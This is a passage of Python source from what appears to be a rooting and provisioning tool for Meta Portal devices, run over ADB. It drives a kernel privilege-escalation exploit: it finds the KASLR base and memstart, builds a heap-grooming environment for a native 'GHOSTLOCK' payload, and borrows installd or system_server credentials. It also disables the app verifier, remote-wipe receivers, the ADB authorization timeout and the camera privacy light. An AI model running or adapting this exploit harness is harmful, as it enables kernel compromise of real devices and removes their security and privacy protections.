        if original != "null" and not re.fullmatch(r"\d{1,19}", original):
            raise ProvisionError(
                f"invalid existing ADB authorization timeout: {original!r}"
            )
        self.push_text_atomic(
            json.dumps({"schema": 1, "value": original}, indent=2) + "\n",
            ADB_AUTH_TIMEOUT_BACKUP_REMOTE,
        )

    def read_adb_auth_timeout_backup(self) -> str:
        result = self.adb_run(
            ["shell", "cat", ADB_AUTH_TIMEOUT_BACKUP_REMOTE],
            timeout=5,
        )
        if result.returncode != 0:
            raise ProvisionError(
                "ADB authorization timeout backup is absent; nothing can be restored"
            )
        try:
            backup = json.loads(result.stdout)
        except json.JSONDecodeError as exc:
            raise ProvisionError(
                f"invalid ADB authorization timeout backup: {exc}"
            ) from exc
        value = backup.get("value") if isinstance(backup, dict) else None
        if (
            not isinstance(backup, dict)
            or backup.get("schema") != 1
            or not isinstance(value, str)
            or (value != "null" and not re.fullmatch(r"\d{1,19}", value))
        ):
            raise ProvisionError("unrecognized ADB authorization timeout backup")
        return value

    def disable_adb_authorization_timeout(self) -> None:
        self.ensure_adb_framework_enabled()
        self.backup_adb_auth_timeout()
        self.adb_run(
            [
                "shell",
                "settings",
                "put",
                "global",
                ADB_AUTH_TIMEOUT_SETTING,
                "0",
            ],
            timeout=10,
            check=True,
        )
        self.verify_adb_auth_timeout()

    def restore_adb_authorization_timeout(self) -> None:
        original = self.read_adb_auth_timeout_backup()
        command = [
            "shell",
            "settings",
            "delete" if original == "null" else "put",
            "global",
            ADB_AUTH_TIMEOUT_SETTING,
        ]
        if original != "null":
            command.append(original)
        self.adb_run(command, timeout=10, check=True)
        self.verify_adb_auth_timeout()

    def verify_adb_auth_timeout(self) -> None:
        actual = self.adb_run(
            ["shell", "settings", "get", "global", ADB_AUTH_TIMEOUT_SETTING],
            timeout=5,
            check=True,
        ).stdout.strip()
        expected = (
            self.read_adb_auth_timeout_backup()
            if self.restore_adb_auth_timeout
            else "0"
        )
        if actual != expected:
            raise ProvisionError(
                "ADB authorization timeout did not persist: "
                f"setting={actual!r}/{expected!r}"
            )
        action = "restored" if self.restore_adb_auth_timeout else "disabled"
        print(
            f"ADB_AUTH_TIMEOUT_OK action={action} "
            f"{ADB_AUTH_TIMEOUT_SETTING}={actual}"
        )

    def apply_privacy_dns(self) -> None:
        return self.settings_feature.apply_privacy_dns()

    def apply_dhcp_dns(self) -> None:
        return self.settings_feature.apply_dhcp_dns()

    def restore_private_dns(self) -> None:
        return self.settings_feature.restore_private_dns()

    def verify_privacy_dns(self) -> None:
        return self.settings_feature.verify_privacy_dns()

    def app_verifier_package_disabled(self) -> bool:
        disabled = self.adb_run(
            ["shell", "pm", "list", "packages", "-d", "-u"],
            timeout=15,
            check=True,
        ).stdout
        return f"package:{APP_VERIFIER_PACKAGE}" in disabled.splitlines()

    def read_app_verifier_backup(self) -> dict[str, object]:
        result = self.adb_run(
            ["shell", "cat", APP_VERIFIER_BACKUP_REMOTE], timeout=5, check=True
        )
        try:
            backup = json.loads(result.stdout)
        except json.JSONDecodeError as exc:
            raise ProvisionError(f"invalid app-verifier backup: {exc}") from exc
        if not isinstance(backup, dict) or backup.get("schema") not in {1, 2}:
            raise ProvisionError("unrecognized app-verifier backup")
        value = backup.get("package_verifier_enable")
        if value not in {"0", "1", "null"}:
            raise ProvisionError("app-verifier backup is incomplete")
        if backup["schema"] == 1:
            # Schema 1 predated package-state management and always left Meta's
            # verifier enabled, so preserve that behavior when upgrading.
            backup["meta_verifier_package_disabled"] = False
        if not isinstance(backup.get("meta_verifier_package_disabled"), bool):
            raise ProvisionError("app-verifier package backup is incomplete")
        return backup

    def write_app_verifier_backup(self, backup: dict[str, object]) -> None:
        with tempfile.TemporaryDirectory(prefix="portal-app-verifier-") as temp:
            local = pathlib.Path(temp) / "app-verifier.json"
            local.write_text(json.dumps(backup, indent=2) + "\n")
            self.adb_run(
                ["push", str(local), APP_VERIFIER_BACKUP_REMOTE],
                timeout=15,
                check=True,
            )
        self.adb_run(
            ["shell", "chmod", "0600", APP_VERIFIER_BACKUP_REMOTE],
            timeout=5,
            check=True,
        )

    def allow_third_party_app_updates(self) -> None:
        existing = self.adb_run(
            ["shell", "test", "-f", APP_VERIFIER_BACKUP_REMOTE], timeout=5
        )
        if existing.returncode != 0:
            original = self.adb_run(
                ["shell", "settings", "get", "global", "package_verifier_enable"],
                timeout=5,
                check=True,
            ).stdout.strip()
            if original not in {"0", "1", "null"}:
                raise ProvisionError(
                    f"unexpected package_verifier_enable value: {original!r}"
                )
            backup = {
                "schema": 2,
                "package_verifier_enable": original,
                "meta_verifier_package_disabled": (
                    self.app_verifier_package_disabled()
                ),
            }
            self.write_app_verifier_backup(backup)
        else:
            backup = self.read_app_verifier_backup()
            if backup["schema"] == 1:
                backup["schema"] = 2
                self.write_app_verifier_backup(backup)
        self.adb_run(
            ["shell", "settings", "put", "global", "package_verifier_enable", "0"],
            timeout=10,
            check=True,
        )
        self.adb_run(
            [
                "shell",
                "pm",
                "disable-user",
                "--user",
                "0",
                APP_VERIFIER_PACKAGE,
            ],
            timeout=15,
            check=True,
        )
        self.adb_run(["shell", "sync"], timeout=10, check=True)
        self.verify_app_verifier_setting()

    def restore_app_verifier_setting(self) -> None:
        backup = self.read_app_verifier_backup()
        original = str(backup["package_verifier_enable"])
        command = [
            "shell",
            "settings",
            "delete" if original == "null" else "put",
            "global",
            "package_verifier_enable",
        ]
        if original != "null":
            command.append(original)
        self.adb_run(command, timeout=10, check=True)
        package_action = (
            "disable-user"
            if backup["meta_verifier_package_disabled"]
            else "enable"
        )
        package_command = [
            "shell",
            "pm",
            package_action,
            "--user",
            "0",
            APP_VERIFIER_PACKAGE,
        ]
        self.adb_run(package_command, timeout=15, check=True)
        self.adb_run(["shell", "sync"], timeout=10, check=True)
        self.verify_app_verifier_setting()

    def verify_app_verifier_setting(self) -> None:
        actual = self.adb_run(
            ["shell", "settings", "get", "global", "package_verifier_enable"],
            timeout=5,
            check=True,
        ).stdout.strip()
        expected = "0"
        expected_package_disabled = True
        action = "updates-allowed"
        if self.restore_app_verifier:
            backup = self.read_app_verifier_backup()
            expected = str(backup["package_verifier_enable"])
            expected_package_disabled = bool(
                backup["meta_verifier_package_disabled"]
            )
            action = "restored"
        package_disabled = self.app_verifier_package_disabled()
        if actual != expected or package_disabled != expected_package_disabled:
            raise ProvisionError(
                "package verifier state did not persist: "
                f"setting={actual!r}/{expected!r} "
                f"package_disabled={int(package_disabled)}/"
                f"{int(expected_package_disabled)}"
            )
        print(
            f"APP_UPDATES_OK action={action} "
            f"package_verifier_enable={actual} "
            f"meta_verifier_disabled={int(package_disabled)}"
        )

    def resolve_shizuku_apk(self) -> pathlib.Path:
        result = self.shizuku_feature.resolve_shizuku_apk()
        self.shizuku_apk = self.shizuku_feature.shizuku_apk
        return result

    def install_shizuku_payload(self) -> None:
        self.shizuku_feature.install_shizuku_payload()
        self.shizuku_public_key = self.shizuku_feature.shizuku_public_key

    def installed_apk_matches(
        self, apk: pathlib.Path, package: str, tag: str
    ) -> bool:
        return self.shizuku_feature.installed_apk_matches(apk, package, tag)

    def install_apk_preserving_verifier(
        self,
        apk: pathlib.Path,
        tag: str,
        package: str | None = None,
    ) -> None:
        result = self.shizuku_feature.install_apk_preserving_verifier(
            apk, tag, package
        )
        self.package_verifier_before_install_disabled = (
            self.shizuku_feature.package_verifier_before_install_disabled
        )
        return result

    def verify_package_verifier_state(self) -> None:
        return self.shizuku_feature.verify_package_verifier_state()

    def uninstall_shizuku_payload(self) -> None:
        return self.shizuku_feature.uninstall_shizuku_payload()

    def finalize_buffered_shizuku_key(self) -> None:
        return self.shizuku_feature.finalize_buffered_shizuku_key()

    def finalize_buffered_uid1000_markers(self) -> None:
        return self.payload_feature.finalize_buffered_uid1000_markers()

    def install_uid1000_runtime_payload(self) -> None:
        self.payload_feature.install_uid1000_runtime_payload()
        self.uid1000_runtime_apk_remote = (
            self.payload_feature.uid1000_runtime_apk_remote
        )
        self.uid1000_runtime_library_remote = (
            self.payload_feature.uid1000_runtime_library_remote
        )
        self.uid1000_runtime_package_installed = (
            self.payload_feature.uid1000_runtime_package_installed
        )

    def uninstall_uid1000_runtime_payload(self, best_effort: bool = False) -> None:
        self.payload_feature.uninstall_uid1000_runtime_payload()
        self.uid1000_runtime_apk_remote = (
            self.payload_feature.uid1000_runtime_apk_remote
        )
        self.uid1000_runtime_library_remote = (
            self.payload_feature.uid1000_runtime_library_remote
        )
        self.uid1000_runtime_package_installed = (
            self.payload_feature.uid1000_runtime_package_installed
        )

    def verify_shizuku(self, wait_seconds: int = 120) -> None:
        return self.shizuku_feature.verify_shizuku(wait_seconds)

    def verify_shizuku_removed(self) -> None:
        return self.shizuku_feature.verify_shizuku_removed()

    def apply_system_theme_request(self) -> None:
        return self.presence_feature.apply_system_theme_request()

    def verify_system_theme_control(self, wait_seconds: int = 20) -> None:
        return self.presence_feature.verify_system_theme_control(wait_seconds)

    def system_theme_control_preflight(self) -> bool:
        return self.presence_feature.system_theme_control_preflight()

    def recover_actions(self) -> bool:
        state = self.read_state()
        self.adb_run(
            [
                "shell",
                "rm",
                "-f",
                PRELOAD_REMOTE,
                HELPER_REMOTE,
                ACCOUNT_CTL_REMOTE,
                COMPONENT_CTL_REMOTE,
                DEBLOAT_COMPONENT_ACTIONS_REMOTE,
                SHIZUKU_KEY_REMOTE,
                PRESENCE_KEY_REMOTE,
                CAMERA_LIGHT_HELPER_REMOTE,
                CAMERA_LIGHT_HOOK_REMOTE,
            ],
            timeout=10,
        )
        if state is None:
            print("RECOVER_NO_STATE staged_files=cleaned")
            self.print_status()
            return False
        if state.get("status") != "pending":
            print(f"RECOVER_STATE status={state.get('status')} action=status")
            self.print_status()
            return False
        actions = state.get("actions")
        if not isinstance(actions, dict):
            raise ProvisionError("pending state has no action map")
        allowed = set(self.requested_actions()) | {
            "persistent_wireless_adb",
            "disable_adb_auth_timeout",
            "restore_adb_auth_timeout",
            "audio",
            "restore_audio",
            "disable_updates",
            "enable_updates",
            "debloat",
            "restore_bloat",
            "block_remote_wipe",
            "restore_remote_wipe",
            "remove_meta_accounts",
            "optimize_presence",
            "restore_presence_profile",
            "presence_fps_cap",
            "restore_presence_fps",
            "privacy_dns",
            "dhcp_dns",
            "restore_privacy_dns",
            "allow_app_updates",
            "restore_app_verifier",
            "shizuku",
            "remove_shizuku",
            "disable_camera_light",
            "restore_camera_light",
            "system_theme_control",
        }
        for name, value in actions.items():
            if name not in allowed:
                raise ProvisionError(f"unsupported recovery action: {name}")
            if name == "privacy_dns":
                if not isinstance(value, str):
                    raise ProvisionError("invalid privacy_dns recovery value")
                self.privacy_dns = value
            elif name == "presence_fps_cap":
                if not isinstance(value, int) or not 1 <= value <= 10:
                    raise ProvisionError("invalid presence_fps_cap recovery value")
                self.presence_fps_cap = value
            elif name == "system_theme_control":
                if value not in {"light", "dark"}:
                    raise ProvisionError(
                        "invalid system_theme_control recovery value"
                    )
                self.system_theme_control = value
            elif value is True:
                setattr(self, name, True)
            else:
                raise ProvisionError(f"invalid recovery value for {name}: {value!r}")
        print("RECOVER_RESUME actions=" + ",".join(sorted(actions)))
        return True

    def meta_accounts(self) -> list[tuple[str, str]]:
        return self.settings_feature.meta_accounts()

    def disabled_meta_authenticators(self) -> set[str]:
        return self.settings_feature.disabled_meta_authenticators()

    def meta_accounts_preflight(self) -> bool:
        result = self.settings_feature.meta_accounts_preflight()
        self.meta_accounts_absent = self.settings_feature.meta_accounts_absent
        return result

    def audio_preflight(self) -> bool:
        return self.audio_feature.audio_preflight()

    def ota_preflight(self) -> bool:
        disabled = self.adb_run(
            ["shell", "pm", "list", "packages", "-d", "-u"],
            timeout=10,
            check=True,
        ).stdout
        packages = (
            self.target.ota_packages
            if self.target
            else (OTA_UI_PACKAGE, OTA_SETUP_PACKAGE)
        )
        packages_disabled = all(
            f"package:{package}" in disabled for package in packages
        )
        ota_dump = self.adb_run(
            ["shell", "dumpsys", "facebook.aloha.otaservice"], timeout=10
        ).stdout
        gate_false = "getBool(kFirmwareOtaUpdateEnable): false" in ota_dump
        healthy = packages_disabled and gate_false
        print(
            "OTA_PREFLIGHT "
            f"packages_disabled={int(packages_disabled)} "
            f"firmware_gate_false={int(gate_false)} "
            f"action={'skip' if healthy else 'install'}"
        )
        return healthy

    def debloat_preflight(self) -> bool:
        return self.settings_feature.debloat_preflight()

    def remote_wipe_preflight(self) -> bool:
        saved = self.read_remote_wipe_backup(required=False)
        current = self.current_named_component_states(
            REMOTE_WIPE_COMPONENTS, detect_missing=True
        )
        complete = saved is not None and all(
            state in {"disabled", "absent"} for state in current.values()
        )
        print(
            "REMOTE_WIPE_PREFLIGHT "
            f"backup_present={int(saved is not None)} "
            f"receivers_disabled={sum(state == 'disabled' for state in current.values())} "
            f"receivers_absent={sum(state == 'absent' for state in current.values())} "
            f"action={'skip' if complete else 'install'}"
        )
        return complete

    def presence_preflight(self) -> bool:
        return self.presence_feature.presence_preflight()

    def presence_fps_preflight(self) -> bool:
        return self.presence_feature.presence_fps_preflight()

    def simpleperf_push_needed(
        self, local: pathlib.Path, remote: str
    ) -> bool:
        """True unless the on-device binary already hashes identically.

        KASLR values are per-boot and can never be cached, but the
        simpleperf binary itself does not change between attempts, so
        re-pushing it on every attempt is pure transfer time. Any doubt
        (missing file, no sha256sum, mismatch) falls back to pushing.
        """
        local_hash = hashlib.sha256(local.read_bytes()).hexdigest()
        result = self.adb_run(
            ["shell", "sha256sum", remote], timeout=20
        )
        if result.returncode != 0:
            return True
        fields = result.stdout.split()
        return not fields or fields[0].lower() != local_hash

    def kaslr_base(self, tag: str) -> int:
        if self.target is None:
            raise ProvisionError("target must be selected before KASLR discovery")
        if self.target.kaslr_strategy == "bugreport":
            report = self.bugreport_text(tag)
            match = re.search(r"\.text\s+: (0x[0-9a-f]+) -", report)
            if not match:
                raise ProvisionError("kernel .text range is absent from bugreport")
            return int(match.group(1), 16)
        offsets = self.target.kaslr_pc_offsets
        simpleperf = "simpleperf"
        if self.target.bundled_simpleperf:
            roots = []
            for name in ("ANDROID_NDK_HOME", "ANDROID_NDK_ROOT", "NDK"):
                value = os.environ.get(name)
                if value:
                    roots.append(pathlib.Path(value))
            for name in ("ANDROID_SDK_ROOT", "ANDROID_HOME"):
                value = os.environ.get(name)
                if value:
                    roots.append(pathlib.Path(value) / "ndk")
            roots.extend(
                (
                    pathlib.Path.home() / "android-sdk/ndk",
                    pathlib.Path.home() / "Android/Sdk/ndk",
                )
            )
            candidates: list[pathlib.Path] = []
            for root in roots:
                if (root / "simpleperf/bin/android/arm64/simpleperf").is_file():
                    candidates.append(root / "simpleperf/bin/android/arm64/simpleperf")
                if root.is_dir():
                    candidates.extend(
                        sorted(
                            root.glob("*/simpleperf/bin/android/arm64/simpleperf"),
                            reverse=True,
                        )
                    )
            local_simpleperf = next(
                (candidate for candidate in candidates if candidate.is_file()),
                None,
            )
            if local_simpleperf is None:
                raise ProvisionError(
                    "this target needs the Android NDK arm64 simpleperf binary; "
                    "set ANDROID_NDK_HOME to the installed NDK directory"
                )
            simpleperf = "/data/local/tmp/portal-simpleperf"
            if self.simpleperf_push_needed(local_simpleperf, simpleperf):
                self.adb_run(
                    ["push", str(local_simpleperf), simpleperf],
                    timeout=120,
                    check=True,
                )
                self.adb_run(
                    ["shell", "chmod", "0755", simpleperf], timeout=20, check=True
                )
            else:
                print(
                    "SIMPLEPERF_PUSH_SKIP reason=on-device-hash-matches",
                    flush=True,
                )
        for sample_try in range(3):
            remote = f"/data/local/tmp/portal-perf-{tag}-{sample_try}.data"
            command = (
                f"{shlex.quote(simpleperf)} record -g -e cpu-clock -f 4000 "
                "--duration 2 "
                f"-o {shlex.quote(remote)} -- /system/bin/dd if=/dev/zero "
                "of=/dev/null bs=4096"
            )
            self.adb_run(["shell", command], timeout=20)
            # report-sample can emit several megabytes for a two-second sample.
            # Filter on-device so remote ADB targets only transfer the kernel
            # addresses used by the KASLR calculation.
            report_command = (
                f"{shlex.quote(simpleperf)} report-sample -i "
                f"{shlex.quote(remote)} | "
                "grep -m 512 'vaddr_in_file: ffffff'"
            )
            report = self.adb_run(["shell", report_command], timeout=60)
            self.adb_run(["shell", "rm", "-f", remote], timeout=5)
            values = [
                int(value, 16)
                for value in re.findall(
                    r"vaddr_in_file: (ffffff[0-9a-f]+)", report.stdout
                )
            ]
            candidates: collections.Counter[int] = collections.Counter()
            for value in values:
                for offset in offsets:
                    base = value - offset
                    if (
                        base >= 0xFFFFFF8000000000
                        and (base - 0xFFFFFF8008080000) & 0x1FFFFF == 0
                    ):
                        candidates[base] += 1
            if candidates:
                return candidates.most_common(1)[0][0]
        raise ProvisionError("simpleperf did not expose a recognized kernel PC")

    def prepare_presence_helper(self) -> None:
        return self.presence_feature.prepare_presence_helper()

    def activate_presence_helper(self) -> None:
        return self.presence_feature.activate_presence_helper()

    def uninstall_presence_helper(self) -> None:
        return self.presence_feature.uninstall_presence_helper()

    def prepare_exploit_sentinel(self) -> None:
        return self.payload_feature.prepare_exploit_sentinel()

    def uninstall_exploit_sentinel(self, best_effort: bool = False) -> None:
        return self.payload_feature.uninstall_exploit_sentinel(best_effort)

    def memstart(self, tag: str) -> int:
        if self.target is None:
            raise ProvisionError("target must be selected before memory discovery")
        if self.target.memstart_strategy == "allocator":
            command = (
                "env GHOSTLOCK_VOLATILE_LOG=1 "
                "GHOSTLOCK_DIAG_PAGE_PREP_ONLY=1 "
                "GHOSTLOCK_PAGE_COLLISIONS=5 "
                "GHOSTLOCK_LOG_P0_CANDIDATES=1 "
                f"LD_PRELOAD={shlex.quote(PRELOAD_REMOTE)} /system/bin/true"
            )
            for _ in range(3):
                result = self.adb_run(["shell", command], timeout=90)
                match = re.search(
                    r"runtime alias .*?memstart=([0-9a-fA-F]{16})",
                    result.stdout,
                )
                if result.returncode == 0 and match:
                    return int(match.group(1), 16)
            raise ProvisionError(
                "allocator diagnostic did not expose a verified memstart_addr"
            )
        report = self.bugreport_text(tag)
        match = re.search(r"memory\s+: (0x[0-9a-f]+) -", report)
        if not match:
            raise ProvisionError("kernel virtual memory range is absent from bugreport")
        virtual_start = int(match.group(1), 16)
        return (
            0x80000000 - (virtual_start - 0xFFFFFFC000000000)
        ) & 0xFFFFFFFFFFFFFFFF

    def bugreport_text(self, tag: str) -> str:
        cached = self._bugreport_cache.get(tag)
        if cached is not None:
            return cached
        result = self.adb_run(["shell", "bugreportz", "-p"], timeout=180)
        match = re.search(r"OK:(\S+\.zip)", result.stdout)
        recovered_archive = False
        if match:
            remote = match.group(1)
        else:
            begun = re.search(r"BEGIN:(\S+\.zip)", result.stdout)
            if not begun:
                raise ProvisionError(f"bugreportz failed: {result.stdout[-500:]}")
            remote = begun.group(1)
            # Omni can finish and rename the ZIP, then reset adbd before the
            # client receives the final OK line. Reconnect and validate that
            # finalized archive instead of discarding a usable capture.
            self.connect(wait_seconds=600)
            if self.adb_run(
                ["shell", "test", "-s", remote], timeout=20
            ).returncode != 0:
                raise ProvisionError(
                    "bugreportz disconnected and its archive is absent: "
                    + remote
                )
            recovered_archive = True
            print(
                "BUGREPORT_ARCHIVE_RECOVERED "
                f"path={remote} returncode={result.returncode}",
                flush=True,
            )
        with tempfile.TemporaryDirectory(prefix=f"portal-{tag}-") as temporary:
            local = pathlib.Path(temporary) / "bugreport.zip"
            report = ""
            for pull_attempt in range(1, 4):
                self.adb_run(
                    ["pull", remote, str(local)], timeout=180, check=True
                )
                try:
                    with zipfile.ZipFile(local) as archive:
                        report_name = next(
                            (
                                name
                                for name in archive.namelist()
                                if pathlib.PurePosixPath(name).name.startswith(
                                    "bugreport-"
                                )
                                and name.endswith(".txt")
                            ),
                            None,
                        )
                        if report_name is None:
                            raise ProvisionError(
                                "bugreport text is absent from archive"
                            )
                        report = archive.read(report_name).decode(
                            errors="replace"
                        )
                    break
                except zipfile.BadZipFile:
                    if pull_attempt == 3:
                        raise ProvisionError(
                            "bugreport archive remained incomplete after "
                            "three pull attempts"
                        )
                    print(
                        "BUGREPORT_ARCHIVE_WAIT "
                        f"attempt={pull_attempt} reason=incomplete-zip",
                        flush=True,
                    )
                    time.sleep(30)
                    self.connect(wait_seconds=600)
            self.adb_run(["shell", "rm", "-f", remote], timeout=20)
        if recovered_archive:
            print("BUGREPORT_ARCHIVE_OK source=finalized-begin", flush=True)
        self._bugreport_cache[tag] = report
        return report

    def build_exploit_environment(
        self, base: int, memstart: int, attempt: int
    ) -> dict[str, str]:
        """Build the native exploit environment for one attempt.

        Shared by exploit() itself and by the autoroot staging, which
        renders this environment (minus the per-boot addresses) into
        the on-device runner's env files so both paths run the native
        payload with identical settings.
        """
        stack_route = self.target.stack_route
        retry_geometry = (
            attempt % 2 == 0
            and self.target.kgsl_reclaim_retry_allocations > 0
        )
        kgsl_reclaim_allocations = (
            self.target.kgsl_reclaim_retry_allocations
            if retry_geometry
            else self.target.kgsl_reclaim_allocations
        )
        mm_recycle_slabs = (
            self.target.mm_recycle_retry_slabs
            if retry_geometry and self.target.mm_recycle_retry_slabs > 0
            else self.target.mm_recycle_slabs
        )
        if retry_geometry:
            print(
                "EXPLOIT_RETRY_GEOMETRY "
                f"attempt={attempt} kgsl_reclaim={kgsl_reclaim_allocations} "
                f"mm_recycle_slabs={mm_recycle_slabs}",
                flush=True,
            )
        environment = {
            "GHOSTLOCK_KASLR_BASE": hex(base),
            "GHOSTLOCK_P0_MEMSTART": hex(memstart),
            "GHOSTLOCK_TRUST_EXTERNAL_KASLR": "1",
            "GHOSTLOCK_MM_PARTIALS": "14",
            "GHOSTLOCK_PAGE_COLLISIONS": "5",
            "GHOSTLOCK_BUDDY_HOLD_PAIRS": "64",
            "GHOSTLOCK_BUDDY_HOLD_SENDS": "1024",
            "GHOSTLOCK_RECLAIM_PAIRS": str(self.target.reclaim_pairs),
            "GHOSTLOCK_RECLAIM_SENDS": str(self.target.reclaim_sends),
            "GHOSTLOCK_SOCKET_WATCH": "1",
            "GHOSTLOCK_WATCH_CFI": "1",
            "GHOSTLOCK_SENDMMSG_PROC_UID_LOCK": "1",
            "GHOSTLOCK_HOLD_AFTER_SCHED": "1",
            "GHOSTLOCK_MAIN_ROUTE": f"slide-{stack_route}",
            "GHOSTLOCK_FOPS_STACK_ROUTE": stack_route,
            "GHOSTLOCK_SIGSTAMP_USEC": str(self.target.route_delay_usec),
            "GHOSTLOCK_PROC_UID_WARM_MB": "256",
            "GHOSTLOCK_ADBD_ROOT_CONFIGFS": "1",
            "GHOSTLOCK_ROOT_SELF_CONFIGFS": "1",
            "GHOSTLOCK_VOLATILE_LOG": "1",
            "LD_PRELOAD": PRELOAD_REMOTE,
        }
        if self.target.break_owner_chain:
            environment["GHOSTLOCK_SLIDE_BREAK_OWNER_CHAIN"] = "1"
        if self.target.kgsl_reclaim:
            environment.update(
                {
                    "GHOSTLOCK_KGSL_ORDER2": "1",
                    "GHOSTLOCK_KGSL_WATCH": "1",
                    "GHOSTLOCK_KGSL_HOLD": "1024",
                    "GHOSTLOCK_KGSL_RECLAIM": str(
                        kgsl_reclaim_allocations
                    ),
                    "GHOSTLOCK_KGSL_RECLAIM_EARLY": "512",
                    "GHOSTLOCK_FOPS_TILE_TABLES": "1",
                }
            )
        if mm_recycle_slabs:
            environment["GHOSTLOCK_MM_RECYCLE_SLABS"] = str(
                mm_recycle_slabs
            )
        if self.target.proc_uid_sentinel in ("run_as", "app", "user"):
            environment["GHOSTLOCK_PROC_UID_APP_SENTINEL"] = "1"
            if self.target.proc_uid_sentinel == "run_as":
                environment.update(
                    {
                    "GHOSTLOCK_PROC_UID_RUNAS_SENTINEL": "1",
                    "GHOSTLOCK_PROC_UID_RUNAS_PACKAGE": (
                        EXPLOIT_SENTINEL_PACKAGE
                    ),
                    }
                )
            elif self.target.proc_uid_sentinel == "app":
                environment["GHOSTLOCK_PROC_UID_APP_COMPONENT"] = (
                    f"{EXPLOIT_SENTINEL_PACKAGE}/.SentinelActivity"
                )
            else:
                environment["GHOSTLOCK_PROC_UID_USER_SENTINEL"] = "1"
                user_ids = (
                    self.exploit_user_ids_runtime
                    or self.target.proc_uid_user_ids
                )
                if user_ids:
                    environment["GHOSTLOCK_SENTINEL_USER_IDS"] = ",".join(
                        str(user_id) for user_id in user_ids
                    )
        else:
            environment["GHOSTLOCK_PROC_UID_SENTINEL_NICE"] = "0"
        if self.persist_wireless_adb:
            environment["GHOSTLOCK_ENABLE_WIRELESS_ADB"] = "1"
            if self.target.wireless_adb_file_property:
                environment["GHOSTLOCK_WIRELESS_ADB_FILE_PROPERTY"] = (
                    self.target.wireless_adb_file_property
                )
            if self.target.wireless_adb_uid1000_boot:
                environment["GHOSTLOCK_UID1000_WIRELESS_ADB"] = "1"
        if self.needs_uid1000_payload() and (
            self.adb_framework_boot_install_requested()
            or self.adb_framework_boot_configured
        ):
            environment["GHOSTLOCK_UID1000_ADB_FRAMEWORK"] = "1"
        if self.audio and not self.audio_already_configured:
            environment.update(
                {
                    "GHOSTLOCK_AUDIO_PERSIST": "1",
                    "GHOSTLOCK_AUDIO_PERSIST_SO": HELPER_REMOTE,
                }
            )
            if self.target.audio_deferred_ctl:
                environment["GHOSTLOCK_AUDIO_CTL_DEFERRED_ONLY"] = "1"
            else:
                environment["GHOSTLOCK_AUDIO_CTL"] = "1"
            if self.target.audio_java_fallback:
                environment.update(
                    {
                        "GHOSTLOCK_AUDIO_CTL_JAVA_DEFERRED": "1",
                        "GHOSTLOCK_AUDIO_PERSIST_JAR": AUDIO_CTL_REMOTE,
                    }
                )
            if self.target.device == "omni":
                environment.update(
                    {
                        "GHOSTLOCK_MHA_TUNING_INSTALL": "1",
                        "GHOSTLOCK_MHA_TUNING_STOCK": MHA_TUNING_STOCK_REMOTE,
                        "GHOSTLOCK_MHA_TUNING_PATCHED": (
                            MHA_TUNING_PATCHED_REMOTE
                        ),
                    }
                )
        if self.restore_audio:
            environment.update(
                {
                    "GHOSTLOCK_RESTORE_AUDIO_PERSIST": "1",
                    "GHOSTLOCK_AUDIO_RESTORE_CTL": "1",
                }
            )
            if self.target.audio_java_fallback:
                environment.update(
                    {
                        "GHOSTLOCK_AUDIO_CTL_JAVA_FALLBACK": "1",
                        "GHOSTLOCK_AUDIO_CTL_JAR": AUDIO_CTL_REMOTE,
                    }
                )
            if self.target.device == "omni":
                environment.update(
                    {
                        "GHOSTLOCK_MHA_TUNING_RESTORE": "1",
                        "GHOSTLOCK_MHA_TUNING_STOCK": MHA_TUNING_STOCK_REMOTE,
                        "GHOSTLOCK_MHA_TUNING_PATCHED": (
                            MHA_TUNING_PATCHED_REMOTE
                        ),
                    }
                )
        private_audio_action = (
            self.target.audio_installer_credentials
            and self.requested_actions()
            in ({"audio": True}, {"restore_audio": True})
        )
        private_ota_action = (
            (
                self.target.ota_installer_credentials
                or self.target.ota_system_credentials
                or self.target.ota_credential_process is not None
            )
            and self.requested_actions()
            in ({"disable_updates": True}, {"enable_updates": True})
        )
        private_meta_action = (
            self.target.meta_accounts_system_credentials
            and self.requested_actions() == {"remove_meta_accounts": True}
            and not self.meta_accounts_absent
            and not self.meta_accounts_auth_only
        )
        private_presence_action = (
            self.target.presence_installer_credentials
            and self.requested_actions()
            in (
                {"optimize_presence": True},
                {"restore_presence_profile": True},
            )
        )
        private_uid1000_action = (
            self.target.uid1000_installer_credentials
            and (
                self.adb_framework_boot_install_requested()
                or self.requested_actions()
                in (
                    {"disable_camera_light": True},
                    {"restore_camera_light": True},
                    {"presence_fps_cap": self.presence_fps_cap},
                    {
                        "optimize_presence": True,
                        "presence_fps_cap": self.presence_fps_cap,
                    },
                    {"restore_presence_fps": True},
                )
            )
        )
        preserve_shell_domain = (
            self.target.shell_root_package_actions
            and (
                self.meta_accounts_auth_only
                or self.meta_accounts_finalize_only
                or
                (
                    self.remove_meta_accounts
                    and not self.meta_accounts_already_clean
                    and self.meta_accounts_absent
                    and self.requested_actions()
                    == {"remove_meta_accounts": True}
                )
                or (
                    set(self.requested_actions())
                    <= {
                        "debloat",
                        "restore_bloat",
                        "block_remote_wipe",
                        "restore_remote_wipe",
                    }
                    and any(
                        (
                            self.debloat,
                            self.restore_bloat,
                            self.block_remote_wipe,
                            self.restore_remote_wipe,
                        )
                    )
                )
            )
        )
        credential_action = (
            private_audio_action
            or private_ota_action
            or private_meta_action
            or private_presence_action
            or private_uid1000_action
        )
        if credential_action:
            if private_meta_action and (
                self.meta_accounts_local_only or self.meta_accounts_finalize_only
            ):
                source_process = "com.facebook.alohaservices.alohausers"
            elif private_ota_action and self.target.ota_credential_process:
                source_process = self.target.ota_credential_process
            else:
                source_process = (
                    "installd"
                    if (
                        private_audio_action
                        or (
                            private_ota_action
                            and not self.target.ota_system_credentials
                        )
                        or private_presence_action
                        or private_uid1000_action
                    )
                    else "system_server"
                )
            process = self.adb_run(
                ["shell", "pidof", source_process],
                timeout=5,
                check=True,
            ).stdout.strip().split()
            uid = self.adb_run(
                [
                    "shell", "stat", "-c", "%u",
                    f"/proc/{process[0]}" if process else "/proc/invalid",
                ],
                timeout=5,
                check=True,
            ).stdout.strip()
            if not process or not uid.isdigit():
                raise ProvisionError(
                    f"could not resolve {source_process} action identity"
                )
            environment.update(
                {
                    "GHOSTLOCK_ACTION_CREDENTIAL_PID": process[0],
                    "GHOSTLOCK_ACTION_EXPECT_UID": uid,
                }
            )
            if private_audio_action:
                environment.update(
                    {
                        "GHOSTLOCK_AUDIO_PRIVATE_ONLY": "1",
                        "GHOSTLOCK_AUDIO_IN_MEMORY_SOURCES": "1",
                        "GHOSTLOCK_AUDIO_PRESERVE_METADATA": "1",
                    }
                )
            if private_ota_action:
                environment["GHOSTLOCK_OTA_PRIVATE_ONLY"] = "1"
            if private_presence_action:
